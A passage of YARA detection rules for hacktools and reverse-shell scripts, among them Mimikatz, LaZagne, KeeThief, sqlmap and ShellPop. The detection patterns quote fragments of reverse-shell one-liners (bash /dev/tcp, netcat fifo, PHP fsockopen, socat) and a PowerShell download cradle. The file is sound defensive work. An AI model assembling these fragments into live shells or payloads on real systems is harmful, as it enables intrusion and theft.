      $op1 = { 83 e9 04 72 0c 83 e0 03 03 c8 ff 24 85 80 6f 40 } /* Opcode */
      $op2 = { 6a 40 33 c0 59 bf e0 d8 40 00 f3 ab 8d 0c 52 c1 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and ( 1 of ($x*) or all of ($op*) ) ) or ( 3 of them )
}

rule Mimikatz_Gen_Strings {
   meta:
      description = "Detects Mimikatz by using some special strings"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-06-19"
      super_rule = 1
      hash1 = "058cc8b3e4e4055f3be460332a62eb4cbef41e3a7832aceb8119fd99fea771c4"
      hash2 = "eefd4c038afa0e80cf6521c69644e286df08c0883f94245902383f50feac0f85"
      hash3 = "f35b589c1cc1c98c4c4a5123fd217bdf0d987c00d2561992cbfb94bd75920159"
   strings:
      $s1 = "[*] '%s' service already started" fullword wide
      $s2 = "** Security Callback! **" fullword wide
      $s3 = "Try to export a software CA to a crypto (virtual)hardware" fullword wide
      $s4 = "enterpriseadmin" fullword wide
      $s5 = "Ask debug privilege" fullword wide
      $s6 = "Injected =)" fullword wide
      $s7 = "** SAM ACCOUNT **" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and 1 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-07-07
   Identifier: 0day
   Reference: Disclosed 0day Repos
*/

/* Rule Set ----------------------------------------------------------------- */

rule Disclosed_0day_POCs_lpe {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07"
      hash1 = "e10ee278f4c86d6ee1bd93a7ed71d4d59c0279381b00eb6153aedfb3a679c0b5"
      hash2 = "a5916cefa0f50622a30c800e7f21df481d7a3e1e12083fef734296a22714d088"
      hash3 = "5b701a5b5bbef7027711071cef2755e57984bfdff569fe99efec14a552d8ee43"
   strings:
      $x1 = "msiexec /f c:\\users\\%username%\\downloads\\" fullword ascii
      $x2 = "c:\\users\\%username%\\downloads\\bat.bat" fullword ascii
      $x3 = "\\payload.msi /quiet" ascii
      $x4 = "\\payload2\\WindowsTrustedRTProxy.sys" fullword wide
      $x5 = "\\payload2" fullword wide
      $x6 = "\\payload" fullword wide
      $x7 = "WindowsTrustedRTProxy.sys /grant:r administrators:RX" ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 70KB and 1 of them )
}

rule Disclosed_0day_POCs_exploit {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07"
      hash1 = "632d35a0bac27c9b2f3f485d43ebba818089cf72b3b8c4d2e87ce735b2e67d7e"
   strings:
      $x1 = "\\Release\\exploit.pdb" ascii
      $x2 = "\\favorites\\stolendata.txt" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule Disclosed_0day_POCs_InjectDll {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07"
      hash1 = "173d3f78c9269f44d069afbd04a692f5ae42d5fdc9f44f074599ec91e8a29aa2"
   strings:
      $x1 = "\\Release\\InjectDll.pdb" fullword ascii
      $x2 = "Specify -l to list all IE processes running in the current session" fullword ascii
      $x3 = "Usage: InjectDll -l|pid PathToDll" fullword ascii
      $x4 = "Injecting DLL: %ls into PID: %d" fullword ascii
      $x5 = "Error adjusting privilege %d" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 1 of them )
}

rule Disclosed_0day_POCs_payload_MSI {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07"
      hash1 = "a7c498a95850e186b7749a96004a98598f45faac2de9b93354ac93e627508a87"
   strings:
      $s1 = "WShell32.dll" fullword wide
      $s2 = "Target empty, so account name translation begins on the local system." fullword wide
      $s3 = "\\custact\\x86\\AICustAct.pdb" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 1000KB and all of them )
}

rule Disclosed_0day_POCs_injector {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07"
      hash1 = "ba0e2119b2a6bad612e86662b643a404426a07444d476472a71452b7e9f94041"
   strings:
      $x1 = "\\Release\\injector.pdb" ascii
      $x2 = "Cannot write the shellcode in the process memory, error: " fullword ascii
      $x3 = "/s shellcode_file PID: shellcode injection." fullword ascii
      $x4 = "/d dll_file PID: dll injection via LoadLibrary()." fullword ascii
      $x5 = "/s shellcode_file PID" fullword ascii
      $x6 = "Shellcode copied in memory: OK" fullword ascii
      $x7 = "Usage of the injector. " fullword ascii
      $x8 = "KO: cannot obtain the SeDebug privilege." fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 90KB and 1 of them ) or 3 of them
}

rule Disclosed_0day_POCs_lpe_2 {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07"
      hash1 = "b4f3787a19b71c47bc4357a5a77ffb456e2f71fd858079d93e694a6a79f66533"
   strings:
      $s1 = "\\cmd.exe\" /k wusa c:\\users\\" ascii
      $s2 = "D:\\gitpoc\\UAC\\src\\x64\\Release\\lpe.pdb" fullword ascii
      $s3 = "Folder Created: " fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 700KB and 2 of them )
}

rule Disclosed_0day_POCs_shellcodegenerator {
   meta:
      description = "Detects POC code from disclosed 0day hacktool set"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Disclosed 0day Repos"
      date = "2017-07-07"
      hash1 = "55c4073bf8d38df7d392aebf9aed2304109d92229971ffac6e1c448986a87916"
   strings:
      $x1 = "\\Release\\shellcodegenerator.pdb" ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 40KB and all of them )
}

rule SecurityXploded_Producer_String {
   meta:
      description = "Detects hacktools by SecurityXploded"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://securityxploded.com/browser-password-dump.php"
      date = "2017-07-13"
      score = 60
      hash1 = "d57847db5458acabc87daee6f30173348ac5956eb25e6b845636e25f5a56ac59"
   strings:
      $x1 = "http://securityxploded.com" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and all of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-07-21
   Identifier: Kekeo
   Reference: https://github.com/gentilkiwi/kekeo/releases
*/

/* Rule Set ----------------------------------------------------------------- */

rule Kekeo_Hacktool {
   meta:
      description = "Detects Kekeo Hacktool"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/gentilkiwi/kekeo/releases"
      date = "2017-07-21"
      hash1 = "ce92c0bcdf63347d84824a02b7a448cf49dd9f44db2d02722d01c72556a2b767"
      hash2 = "49d7fec5feff20b3b57b26faccd50bc05c71f1dddf5800eb4abaca14b83bba8c"
   strings:
      $x1 = "[ticket %u] session Key is NULL, maybe a TGT without enough rights when WCE dumped it." fullword wide
      $x2 = "ERROR kuhl_m_smb_time ; Invalid! Command: %02x - Status: %08x" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 1 of ($x*) ) )
}


/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-07-27
   Identifier: AllTheThings
   Reference: https://github.com/subTee/AllTheThings
*/

/* Rule Set ----------------------------------------------------------------- */

rule AllTheThings {
   meta:
      description = "Detects AllTheThings"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/subTee/AllTheThings"
      date = "2017-07-27"
      hash1 = "5a0e9a9ce00d843ea95bd5333b6ab50cc5b1dbea648cc819cfe48482513ce842"
   strings:
      $x1 = "\\obj\\Debug\\AllTheThings.pdb" fullword ascii
      $x2 = "AllTheThings.exe" fullword wide
      $x3 = "\\AllTheThings.dll" fullword ascii
      $x4 = "Hello From Main...I Don't Do Anything" fullword wide
      $x5 = "I am a basic COM Object" fullword wide
      $x6 = "I shouldn't really execute either." fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 50KB and 1 of them )
}

rule Impacket_Keyword {
   meta:
      description = "Detects Impacket Keyword in Executable"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-08-04"
      score = 60
      hash1 = "9388c78ea6a78dbea307470c94848ae2481481f593d878da7763e649eaab4068"
      hash2 = "2f6d95e0e15174cfe8e30aaa2c53c74fdd13f9231406b7103da1e099c08be409"
   strings:
      $s1 = "impacket.smb(" fullword ascii
      $s2 = "impacket.ntlm(" fullword ascii
      $s3 = "impacket.nmb(" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and 1 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-08-27
   Reference: PasswordPro
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule PasswordsPro {
   meta:
      description = "Auto-generated rule - file PasswordsPro.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "PasswordPro"
      date = "2017-08-27"
      hash1 = "5b3d6654e6d9dc49ee1136c0c8e8122cb0d284562447abfdc05dfe38c79f95bf"
   strings:
      $s1 = "No users marked for attack or all marked users already have passwords found!" fullword ascii
      $s2 = "%s\\PasswordsPro.ini.Dictionaries(%d)" fullword ascii
      $s3 = "Passwords processed since attack start:" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 2000KB and
         1 of them
      )
}

rule PasswordPro_NTLM_DLL {
   meta:
      description = "Auto-generated rule - file NTLM.dll"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "PasswordPro"
      date = "2017-08-27"
      hash1 = "47d4755d31bb96147e6230d8ea1ecc3065da8e557e8176435ccbcaea16fe50de"
   strings:
      $s1 = "NTLM.dll" fullword ascii
      $s2 = "Algorithm: NTLM" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 20KB and
        pe.exports("GetHash") and pe.exports("GetInfo") and
        ( all of them )
      )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-08-29
   Identifier: KeeTheft
   Reference: https://github.com/HarmJ0y/KeeThief
*/

/* Rule Set ----------------------------------------------------------------- */

rule KeeThief_PS {
   meta:
      description = "Detects component of KeeTheft - KeePass dump tool - file KeeThief.ps1"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/HarmJ0y/KeeThief"
      date = "2017-08-29"
      hash1 = "a3b976279ded8e64b548c1d487212b46b03aaec02cb6e199ea620bd04b8de42f"
   strings:
      $x1 = "$WMIProcess = Get-WmiObject win32_process -Filter \"ProcessID = $($KeePassProcess.ID)\"" fullword ascii
      $x2 = "if($KeePassProcess.FileVersion -match '^2\\.') {" fullword ascii
   condition:
      ( uint16(0) == 0x7223 and
        filesize < 1000KB and
        ( 1 of ($x*) )
      )
}

rule KeeTheft_EXE {
   meta:
      description = "Detects component of KeeTheft - KeePass dump tool - file KeeTheft.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/HarmJ0y/KeeThief"
      date = "2017-08-29"
      hash1 = "f06789c3e9fe93c165889799608e59dda6b10331b931601c2b5ae06ede41dc22"
   strings:
      $x1 = "Error: Could not create a thread for the shellcode" fullword wide
      $x2 = "Could not find address marker in shellcode" fullword wide
      $x3 = "GenerateDecryptionShellCode" fullword ascii
      $x4 = "KeePassLib.Keys.KcpPassword" fullword wide
      $x5 = "************ Found a CompositeKey! **********" fullword wide
      $x6 = "*** Interesting... there are multiple .NET runtimes loaded in KeePass" fullword wide
      $x7 = "GetKcpPasswordInfo" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 2 of them )
}

rule KeeTheft_Out_Shellcode {
   meta:
      description = "Detects component of KeeTheft - KeePass dump tool - file Out-Shellcode.ps1"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/HarmJ0y/KeeThief"
      date = "2017-08-29"
      hash1 = "2afb1c8c82363a0ae43cad9d448dd20bb7d2762aa5ed3672cd8e14dee568e16b"
   strings:
      $x1 = "Write-Host \"Shellcode length: 0x$(($ShellcodeLength + 1).ToString('X4'))\"" fullword ascii
      $x2 = "$TextSectionInfo = @($MapContents | Where-Object { $_ -match '\\.text\\W+CODE' })[0]" fullword ascii
   condition:
      ( filesize < 2KB and 1 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-09-23
   Identifier: Sharpire
   Reference: https://github.com/0xbadjuju/Sharpire
*/

rule Sharpire {
   meta:
      description = "Auto-generated rule - file Sharpire.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/0xbadjuju/Sharpire"
      date = "2017-09-23"
      hash1 = "327a1dc2876cd9d7f6a5b3777373087296fc809d466e42861adcf09986c6e587"
   strings:
      $x1 = "\\obj\\Debug\\Sharpire.pdb" fullword ascii
      $x2 = "[*] Upload of $fileName successful" fullword wide

      $s1 = "no shell command supplied" fullword wide
      $s2 = "/login/process.php" fullword wide
      $s3 = "invokeShellCommand" fullword ascii
      $s4 = "..Command execution completed." fullword wide
      $s5 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" fullword wide
      $s6 = "/admin/get.php" fullword wide
      $s7 = "[!] Error in stopping job: " fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and ( 1 of ($x*) and 3 of them ) )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-09-23
   Identifier: Invoke-Metasploit
   Reference: https://github.com/jaredhaight/Invoke-MetasploitPayload/blob/master/Invoke-MetasploitPayload.ps1
*/

rule Invoke_Metasploit {
   meta:
      description = "Detects Invoke-Metasploit Payload"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/jaredhaight/Invoke-MetasploitPayload/blob/master/Invoke-MetasploitPayload.ps1"
      date = "2017-09-23"
      hash1 = "b36d3ca7073741c8a48c578edaa6d3b6a8c3c4413e961a83ad08ad128b843e0b"
   strings:
      $s1 = "[*] Looks like we're 64bit, using regular powershell.exe" ascii wide
      $s2 = "[*] Kicking off download cradle in a new process"
      $s3 = "Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('''+$url+''');'"
   condition:
      ( filesize < 20KB and 1 of them )
}

rule PowerShell_Mal_HackTool_Gen {
   meta:
      description = "Detects PowerShell hack tool samples - generic PE loader"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-11-02"
      hash1 = "d442304ca839d75b34e30e49a8b9437b5ab60b74d85ba9005642632ce7038b32"
   strings:
      $x1 = "$PEBytes32 = 'TVqQAAMAAAAEAAAA" wide
      $x2 = "Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp" fullword wide
      $x3 = "@($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs)" fullword wide
      $x4 = "(Shellcode: LoadLibraryA.asm)" fullword wide
   condition:
      filesize < 8000KB and 1 of them
}

rule Sig_RemoteAdmin_1 {
   meta:
      description = "Detects strings from well-known APT malware"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-12-03"
      score = 45
   strings:
      $ = "Radmin, Remote Administrator" wide
      $ = "Radmin 3.0" wide
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and 1 of them
}

rule RemCom_RemoteCommandExecution {
   meta:
      description = "Detects strings from RemCom tool"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://goo.gl/tezXZt"
      date = "2017-12-28"
      score = 50
   strings:
      $ = "\\\\.\\pipe\\%s%s%d"
      $ = "%s\\pipe\\%s%s%d%s"
      $ = "\\ADMIN$\\System32\\%s%s"
   condition:
      1 of them
}

rule Crackmapexec_EXE {
   meta:
      description = "Detects CrackMapExec hack tool"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-04-06"
      score = 85
      hash1 = "371f104b7876b9080c519510879235f36edb6668097de475949b84ab72ee9a9a"
   strings:
      $s1 = "core.scripts.secretsdump(" fullword ascii
      $s2 = "core.scripts.samrdump(" fullword ascii
      $s3 = "core.uacdump(" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and 2 of them
}


rule MAL_Unknown_PWDumper_Apr18_3 {
   meta:
      description = "Detects sample from unknown sample set - IL origin"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-04-06"
      hash1 = "d435e7b6f040a186efeadb87dd6d9a14e038921dc8b8658026a90ae94b4c8b05"
      hash2 = "8c35c71838f34f7f7a40bf06e1d2e14d58d9106e6d4e6f6e9af732511a126276"
   strings:
      $s1 = "loaderx86.dll" fullword ascii
      $s2 = "tcpsvcs.exe" fullword wide
      $s3 = "%Program Files, Common FOLDER%" fullword wide
      $s4 = "%AllUsers, ApplicationData FOLDER%" fullword wide
      $s5 = "loaderx86" fullword ascii
      $s6 = "TNtDllHook$" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}


rule Lazagne_PW_Dumper {
   meta:
      description = "Detects Lazagne PW Dumper"
      author = "Markus Neis / Florian Roth"
      reference = "https://github.com/AlessandroZ/LaZagne/releases/"
      date = "2018-03-22"
      score = 70
   strings:
      $s1 = "Crypto.Hash" fullword ascii
      $s2 = "laZagne" fullword ascii
      $s3 = "impacket.winregistry" fullword ascii
   condition:
      3 of them
}

rule HKTL_shellpop_TCLsh {
   meta:
      description = "Detects suspicious TCLsh popshell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "9f49d76d70d14bbe639a3c16763d3b4bee92c622ecb1c351cb4ea4371561e133"
   strings:
      $s1 = "{ puts -nonewline $s \"shell>\";flush $s;gets $s c;set e \"exec $c\";if" ascii
   condition:
      filesize < 1KB and 1 of them
}

rule HKTL_shellpop_ruby {
   meta:
      description = "Detects suspicious ruby shellpop"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "6b425b37f3520fd8c778928cc160134a293db0ce6d691e56a27894354b04f783"
   strings:
      $x1 = ");while(cmd=c.gets);IO.popen(cmd,'r'){" ascii
   condition:
      filesize < 1KB and all of them
}

rule HKTL_shellpop_awk {
   meta:
      description = "Detects suspicious AWK Shellpop"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "7513a0a0ba786b0e22a9a7413491b4011f60af11253c596fa6857fb92a6736fc"
   strings:
      $s1 = "awk 'BEGIN {s = \"/inet/tcp/0/" ascii
      $s2 = "; while(42) " ascii
   condition:
      filesize < 1KB and 1 of them
}

rule HKTL_shellpop_Netcat_UDP {
   meta:
      description = "Detects suspicious netcat popshell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "d823ad91b315c25893ce8627af285bcf4e161f9bbf7c070ee2565545084e88be"
   strings:
      $s1 = "mkfifo fifo ; nc.traditional -u" ascii
      $s2 = "< fifo | { bash -i; } > fifo" fullword ascii
   condition:
      filesize < 1KB and 1 of them
}

rule HKTL_shellpop_socat {
   meta:
      description = "Detects suspicious socat popshell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "267f69858a5490efb236628260b275ad4bbfeebf4a83fab8776e333ca706a6a0"
   strings:
      $s1 = "socat tcp-connect" ascii
      $s2 = ",pty,stderr,setsid,sigint,sane" ascii
   condition:
      filesize < 1KB and 2 of them
}

rule HKTL_shellpop_Perl {
   meta:
      description = "Detects Shellpop Perl script"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "32c3e287969398a070adaad9b819ee9228174c9cb318d230331d33cda51314eb"
   strings:
      $ = "perl -e 'use IO::Socket::INET;$|=1;my ($s,$r);" ascii
      $ = ";STDIN->fdopen(\\$c,r);$~->fdopen(\\$c,w);s" ascii
   condition:
      filesize < 2KB and 1 of them
}

rule HKTL_shellpop_Python {
   meta:
      description = "Detects malicious python shell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "aee1c9e45a1edb5e462522e266256f68313e2ff5956a55f0a84f33bc6baa980b"
   strings:
      $ = "os.putenv('HISTFILE', '/dev/null');" ascii
   condition:
      filesize < 2KB and 1 of them
}

rule HKTL_shellpop_PHP_TCP {
   meta:
      description = "Detects malicious PHP shell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "0412e1ab9c672abecb3979a401f67d35a4a830c65f34bdee3f87e87d060f0290"
   strings:
      $x1 = "php -r \"\\$sock=fsockopen" ascii
      $x2 = ";exec('/bin/sh -i <&3 >&3 2>&3');\"" ascii
   condition:
      filesize < 3KB and all of them
}

rule HKTL_shellpop_Powershell_TCP {
   meta:
      description = "Detects malicious powershell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "8328806700696ffe8cc37a0b81a67a6e9c86bb416364805b8aceaee5db17333f"
   strings:
      $ = "Something went wrong with execution of command on the target" ascii
      $ = ";[byte[]]$bytes = 0..65535|%{0};$sendbytes =" ascii
   condition:
      filesize < 3KB and 1 of them
}

rule SUSP_Powershell_ShellCommand_May18_1 {
   meta:
      description = "Detects a supcicious powershell commandline"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "8328806700696ffe8cc37a0b81a67a6e9c86bb416364805b8aceaee5db17333f"
   strings:
      $x1 = "powershell -nop -ep bypass -Command" ascii
   condition:
      filesize < 3KB and 1 of them

}

rule HKTL_shellpop_Telnet_TCP {
   meta:
      description = "Detects malicious telnet shell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "cf5232bae0364606361adafab32f19cf56764a9d3aef94890dda9f7fcd684a0e"
   strings:
      $x1 = "if [ -e /tmp/f ]; then rm /tmp/f;" ascii
      $x2 = "0</tmp/f|/bin/bash 1>/tmp/f" fullword ascii
   condition:
      filesize < 3KB and 1 of them
}

rule SUSP_shellpop_Bash {
   meta:
      description = "Detects susupicious bash command"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "36fad575a8bc459d0c2e3ad626e97d5cf4f5f8bedc56b3cc27dd2f7d88ed889b"
   strings:
      $ = "/bin/bash -i >& /dev/tcp/" ascii
   condition:
      1 of them
}

rule HKTL_shellpop_netcat {
   meta:
      description = "Detects suspcious netcat shellpop"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18"
      hash1 = "98e3324f4c096bb1e5533114249a9e5c43c7913afa3070488b16d5b209e015ee"
   strings:
      $s1 = "if [ -e /tmp/f ]; then rm /tmp/f;"  ascii
      $s2 = "fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc" ascii
      $s4 = "mknod /tmp/f p && nc" ascii
      $s5 = "</tmp/f|/bin/bash 1>/tmp/f"  ascii
    condition:
      filesize < 2KB and 1 of them
}


rule HKTL_beRootexe {
   meta:
      description = "Detects beRoot.exe which checks common Windows missconfigurations"
      author = "yarGen Rule Generator"
      reference = "https://github.com/AlessandroZ/BeRoot/tree/master/Windows"
      date = "2018-07-25"
      hash1 = "865b3b8ec9d03d3475286c3030958d90fc72b21b0dca38e5bf8e236602136dd7"
   strings:
      $s1 = "checks.webclient.secretsdump(" fullword ascii
      $s2 = "beroot.modules" fullword ascii
      $s3 = "beRoot.exe.manifest" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 18000KB and
        1 of them)
}

rule HKTL_beRootexe_output {
   meta:
      description = "Detects the output of beRoot.exe"
      author = "Tobias Michalski"
      reference = "https://github.com/AlessandroZ/BeRoot/tree/master/Windows"
      date = "2018-07-25"
   strings:
      $s1 = "permissions: {'change_config'" fullword wide
      $s2 = "Full path: C:\\Windows\\system32\\msiexec.exe /V" fullword wide
      $s3 = "Full path: C:\\Windows\\system32\\svchost.exe -k DevicesFlow" fullword wide
      $s4 = "! BANG BANG !" fullword wide
   condition:
      filesize < 400KB and 3 of them
}

rule HKTL_EmbeddedPDF {
   meta:
      description = "Detects Embedded PDFs which can start malicious content"
      author = "Tobias Michalski"
      reference = "https://twitter.com/infosecn1nja/status/1021399595899731968?s=12"
      date = "2018-07-25"
   strings:
      $x1 = "/Type /Action\n /S /JavaScript\n /JS (this.exportDataObject({" fullword ascii

      $s1 = "(This PDF document embeds file" fullword ascii
      $s2 = "/Names << /EmbeddedFiles << /Names" fullword ascii
      $s3 = "/Type /EmbeddedFile" fullword ascii

   condition:
      uint16(0) == 0x5025 and
      2 of ($s*) and $x1
}

rule HTKL_BlackBone_DriverInjector {
   meta:
      description = "Detects BlackBone Driver injector"
      author = "Florian Roth"
      reference = "https://github.com/DarthTon/Blackbone"
      date = "2018-09-11"
      score = 60
      hash1 = "8062a4284c719412270614458150cb4abbdf77b2fc35f770ce9c45d10ccb1f4d"
      hash2 = "2d2fc27200c22442ac03e2f454b6e1f90f2bbc17017f05b09f7824fac6beb14b"
      hash3 = "e45da157483232d9c9c72f44b13fca2a0d268393044db00104cc1afe184ca8d1"
   strings:
      $s1 = "=INITtH=PAGEtA" fullword ascii
      $s2 = "BBInjectDll" fullword ascii
      $s3 = "LdrLoadDll" fullword ascii
      $s4 = "\\??\\pipe\\%ls" fullword wide
      $s5 = "Failed to retrieve Kernel base address. Aborting" fullword ascii

      $x2 = "BlackBone: %s: APC injection failed with status 0x%X" fullword ascii
      $x3 = "BlackBone: PDE_BASE/PTE_BASE not found " fullword ascii
      $x4 = "%s: Invalid injection type specified - %d" fullword ascii
      $x6 = "Trying to map C:\\windows\\system32\\cmd.exe into current process" fullword wide
      $x7 = "\\BlackBoneDrv\\bin\\" ascii
      $x8 = "DosDevices\\BlackBone" wide
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and ( 3 of them or 1 of ($x*) )
}

rule HKTL_SqlMap {
   meta:
      description = "Detects sqlmap hacktool"
      author = "Florian Roth"
      reference = "https://github.com/sqlmapproject/sqlmap"
      date = "2018-10-09"
      hash1 = "9444478b03caf7af853a64696dd70083bfe67f76aa08a16a151c00aadb540fa8"
   strings:
      $x1 = "if cmdLineOptions.get(\"sqlmapShell\"):" fullword ascii
      $x2 = "if conf.get(\"dumper\"):" fullword ascii
   condition:
      filesize < 50KB and 1 of them
}

rule HKTL_SqlMap_backdoor {
   meta:
      description = "Detects SqlMap backdoors"
      author = "Florian Roth"
      reference = "https://github.com/sqlmapproject/sqlmap"
      date = "2018-10-09"
   condition:
      ( uint32(0) == 0x8e859c07 or
         uint32(0) == 0x2d859c07 or
         uint32(0) == 0x92959c07 or
         uint32(0) == 0x929d9c07 or
         uint32(0) == 0x29959c07 or
         uint32(0) == 0x2b8d9c07 or
         uint32(0) == 0x2b859c07 or
         uint32(0) == 0x28b59c07 ) and filesize < 2KB
}

rule HKTL_Lazagne_PasswordDumper_Dec18_1 {
   meta:
      description = "Detects password dumper Lazagne often used by middle eastern threat groups"
      author = "Florian Roth"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      reference = "https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group"
      date = "2018-12-11"
      score = 85
      hash1 = "1205f5845035e3ee30f5a1ced5500d8345246ef4900bcb4ba67ef72c0f79966c"
      hash2 = "884e991d2066163e02472ea82d89b64e252537b28c58ad57d9d648b969de6a63"
      hash3 = "bf8f30031769aa880cdbe22bc0be32691d9f7913af75a5b68f8426d4f0c7be50"
   strings:
      $s1 = "softwares.opera(" fullword ascii
      $s2 = "softwares.mozilla(" fullword ascii
      $s3 = "config.dico(" fullword ascii
      $s4 = "softwares.chrome(" fullword ascii
      $s5 = "softwares.outlook(" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 17000KB and 1 of them
}

rule HKTL_Lazagne_Gen_18 {
   meta:
      description = "Detects Lazagne password extractor hacktool"
      author = "Florian Roth"
      reference = "https://github.com/AlessandroZ/LaZagne"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      date = "2018-12-11"
      score = 80
      hash1 = "51121dd5fbdfe8db7d3a5311e3e9c904d644ff7221b60284c03347938577eecf"
   strings:
